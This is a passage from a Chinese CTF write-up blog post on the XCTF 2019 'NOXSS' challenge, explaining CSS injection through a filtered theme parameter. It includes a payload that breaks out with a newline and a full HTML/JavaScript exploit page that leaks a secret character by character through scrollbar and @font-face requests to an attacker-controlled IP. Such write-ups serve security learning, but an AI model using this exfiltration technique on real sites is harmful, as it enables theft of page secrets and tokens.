            <span class=p>})</span>
        <span class=p>}</span>
        
    <span class=p>})();</span>
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</code></pre></div><p>但是我没成功过2333&mldr;</p>
<h1 id=noxss>NOXSS</h1>
<p>终于可以回到我们的题目了，其实走完以上流程，这个题目已经迎刃而解了，出题人出的点也正是 token2 的点。</p>
<p>随便注册一个账号之后，我们可以在 theme 参数发现有代码注入的地方，但是过滤了尖括号，我们可以用<code>%0a</code>进行换行</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120133900.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120133900.png loading=lazy>
</a>
</figure></p>
<p>但是我们的最终目的跟 token2 场景类似，还是拿到 script 标签中的 secret 变量</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120134348.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120134348.png loading=lazy>
</a>
</figure></p>
<p>根据 token2 场景的解法，接下来我们至少需要做到可以执行我们任意 css 代码才行。</p>
<p>根据文档<a class=link href=https://www.w3.org/TR/css-syntax-3/#newline-diagram target=_blank rel=noopener>css newline</a>，我们可以知道换行有如下写法：</p>
<p><figure>
<a href=https://xzfile.aliyuncs.com/media/upload/picture/20191029162244-48373126-fa25-1.png><img src=https://xzfile.aliyuncs.com/media/upload/picture/20191029162244-48373126-fa25-1.png loading=lazy>
</a>
</figure></p>
<p>而且文档里也提到了<a class=link href=https://www.w3.org/TR/css-syntax-3/#error-handling target=_blank rel=noopener>error-handling</a></p>
<blockquote>
<p>​ When errors occur in CSS, the parser attempts to recover gracefully, throwing away only the minimum amount of content before returning to parsing as normal. This is because errors aren’t always mistakes—new syntax looks like an error to an old parser, and it’s useful to be able to add new syntax to the language without worrying about stylesheets that include it being completely broken in older UAs.</p>
</blockquote>
<p>css 兼容性比较强，对于错误的处理也比较宽松，这里由于自己的知识有限，也暂时没有找到 chrome 对于 css 错误处理相关的内容，但是经过我们不断尝试，我们可以发现使用如下 payload 可以任意执行我们的 css 代码：</p>
<pre tabindex=0><code>%0a){}body{background:red}%2f*
</code></pre><p>对于以上，问了 @zsx 师傅，以下是他的原话（<del>你看看这是人说的吗</del>orz）：</p>
<blockquote>
<p>​ 我wp写了，看了下w3c标准，再随便fuzz一下就ok了</p>
</blockquote>
<p>我的理解是这里用<code>%0a</code>进行了换行，但是由于括号的解析还没结束，所以我们需要用<code>)</code>来将<code>import</code>的括号进行闭合，然后再用<code>{}</code>制定空样式，后面就可以任意注入 css 代码了。</p>
<p>如果有师傅看了 chromium 有非常硬核的理解，还望不吝赐教，带带我这个菜鸡。//感觉本文的关键点也不在这</p>
<p>然后我们就可以利用 token2 的方法，利用滚动条来 leak secret 了，只要自己做个 iframe 引用我们构造的 payload 即可，比如</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
        <span class=c1>//const chars = [&#39;t&#39;,&#39;f&#39;]
</span><span class=c1></span>        <span class=kr>const</span> <span class=nx>chars</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_&#39;</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
        <span class=kd>let</span> <span class=nx>ff</span> <span class=o>=</span> <span class=p>[],</span>
            <span class=nx>data</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
        <span class=kd>let</span> <span class=nx>prefix</span> <span class=o>=</span> <span class=s1>&#39;xctf{&#39;</span>
        <span class=nx>chars</span><span class=p>.</span><span class=nx>forEach</span><span class=p>(</span><span class=nx>c</span> <span class=p>=&gt;</span> <span class=p>{</span>
            <span class=kd>var</span> <span class=nx>css</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
            <span class=nx>css</span> <span class=o>=</span> <span class=s1>&#39;?theme=../../../../\fa{}){}&#39;</span>
            <span class=nx>css</span> <span class=o>+=</span>
                <span class=sb>`body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://172.16.71.138:9999/?</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>prefix</span><span class=o>+</span><span class=nx>c</span><span class=p>)</span><span class=si>}</span><span class=sb>)}`</span>
            <span class=nx>css</span> <span class=o>+=</span> <span class=sb>`@font-face{font-family:a</span><span class=si>${</span><span class=nx>c</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>()</span><span class=si>}</span><span class=sb>;src:url(http://172.16.71.138:23460/font/</span><span class=si>${</span><span class=nx>prefix</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>c</span><span class=si>}</span><span class=sb>);}`</span>
            <span class=nx>css</span> <span class=o>+=</span> <span class=sb>`script{font-family:a</span><span class=si>${</span><span class=nx>c</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>()</span><span class=si>}</span><span class=sb>;display:block}`</span>
            <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span>
                <span class=s1>&#39;&lt;iframe scrolling=yes samesite src=&#34;http://127.0.0.1/noxss.php?theme=&#39;</span> <span class=o>+</span>
                <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>css</span><span class=p>)</span> <span class=o>+</span>
                <span class=s1>&#39;&#34; style=&#34;width:1000000px&#34; onload=&#34;event.target.style.width=\&#39;100px\&#39;&#34;&gt;&lt;/iframe&gt;&#39;</span><span class=p>)</span>
        <span class=p>})</span>
    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>

<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p>这里我用 php 简单模拟了题目环境，做起来比较简便，也比较开心</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002617.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002617.png loading=lazy>
</a>
</figure></p>
<p>And&mldr;</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002928.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002928.png loading=lazy>
</a>
</figure></p>
<p>现场做出来的真是 CSS 带师 orz&mldr;</p>
<h1 id=reference>Reference</h1>
<p><a class=link href=https://xz.aliyun.com/t/6655#toc-5 target=_blank rel=noopener>XCTF final 2019 Writeup By ROIS</a></p>
<p><a class=link href=https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/ target=_blank rel=noopener>通过CSS注入窃取HTML中的数据</a></p>
<p><a class=link href=https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/ target=_blank rel=noopener>Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a></p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2021/12/27/2021-12-20-ANewNovelLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2>
</div>
</a>
</article>
<article>
<a href=/2021/08/02/cybrics-checkin-2021/>
<div class=article-details>
<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
</div>
</a>
</article>
<article>
<a href=/2021/07/21/google-qual-2021/>
<div class=article-details>
<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
</div>
</a>
</article>
<article>
<a href=/2021/05/19/tls-ctf/>
<div class=article-details>
<h2 class=article-title>TLS-Poison 攻击方式在 CTF 中的利用实践</h2>
</div>
</a>
</article>
<article>
<a href=/2020/10/15/Defcon28final/>
<div class=article-details>
<h2 class=article-title>DEFCON 28 Final 杂记</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2022 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#intro>INTRO</a>
<ol>
<li><a href=#token1---get-from-input>Token1 - Get From Input</a></li>
<li><a href=#token1---auto-get-from-input>Token1 - Auto Get From Input</a></li>
<li><a href=#token1---same-origin>Token1 - Same Origin</a></li>
<li><a href=#token2---font>Token2 - Font</a></li>
<li><a href=#token2---get-from-javascript>Token2 - Get From JavaScript</a></li>
</ol>
</li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>